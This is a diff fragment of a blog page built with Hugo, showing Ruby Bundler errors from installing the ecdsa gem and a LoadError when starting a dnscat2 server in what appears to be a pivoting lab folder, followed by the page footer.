+</span></span><span style="display:flex;"><span>  /var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/source/rubygems.rb:484:in <span style="color:#e6db74">`</span>download_gem<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  /var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/source/rubygems.rb:446:in `fetch_gem&#39;</span>
+</span></span><span style="display:flex;"><span>/var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/source/rubygems.rb:430:in
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">`</span>fetch_gem_if_possible<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  /var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/source/rubygems.rb:160:in `install&#39;</span>
+</span></span><span style="display:flex;"><span>  /var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/installer/gem_installer.rb:54:in <span style="color:#e6db74">`</span>install<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/installer/gem_installer.rb:16:in
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">`install_from_spec&#39;</span>
+</span></span><span style="display:flex;"><span>/var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/installer/parallel_installer.rb:156:in
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">`</span>do_install<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/installer/parallel_installer.rb:147:in `block
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">in worker_pool&#39;</span>
+</span></span><span style="display:flex;"><span>  /var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/worker.rb:62:in <span style="color:#e6db74">`</span>apply_func<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  /var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/worker.rb:57:in `block in process_queue&#39;</span>
+</span></span><span style="display:flex;"><span>  /var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/worker.rb:54:in <span style="color:#e6db74">`</span>loop<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  /var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/worker.rb:54:in `process_queue&#39;</span>
+</span></span><span style="display:flex;"><span>/var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/worker.rb:90:in <span style="color:#e6db74">`</span>block <span style="color:#f92672">(</span><span style="color:#ae81ff">2</span> levels<span style="color:#f92672">)</span> in
+</span></span><span style="display:flex;"><span>create_threads<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>An error occurred <span style="color:#66d9ef">while</span> installing ecdsa <span style="color:#f92672">(</span>1.2.0<span style="color:#f92672">)</span>, and Bundler cannot <span style="color:#66d9ef">continue</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>In Gemfile:
+</span></span><span style="display:flex;"><span>  ecdsa
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>New window created: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in require<span style="color:#e6db74">&#39;: cannot load such file -- ecdsa (LoadError) 	from &lt;internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb&gt;:85:in require&#39;</span>
+</span></span><span style="display:flex;"><span>from /home/wav/academy/pivot/dnsp/dnscat2/server/controller/encryptor.rb:10:in &lt;top <span style="color:#f92672">(</span>required<span style="color:#f92672">)</span>&gt;<span style="color:#e6db74">&#39; 	from &lt;internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb&gt;:85:in require&#39;</span>
+</span></span><span style="display:flex;"><span>from internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in require<span style="color:#e6db74">&#39; 	from /home/wav/academy/pivot/dnsp/dnscat2/server/controller/session.rb:10:in &lt;top (required)&gt;&#39;</span>
+</span></span><span style="display:flex;"><span>from internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in require<span style="color:#e6db74">&#39; 	from &lt;internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb&gt;:85:in require&#39;</span>
+</span></span><span style="display:flex;"><span>from /home/wav/academy/pivot/dnsp/dnscat2/server/controller/controller.rb:13:in &lt;top <span style="color:#f92672">(</span>required<span style="color:#f92672">)</span>&gt;<span style="color:#e6db74">&#39; 	from &lt;internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb&gt;:85:in require&#39;</span>
+</span></span><span style="display:flex;"><span>from internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in require<span style="color:#e6db74">&#39; 	from dnscat2.rb:20:in &lt;main&gt;&#39;</span>
+</span></span></code></pre></div>
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
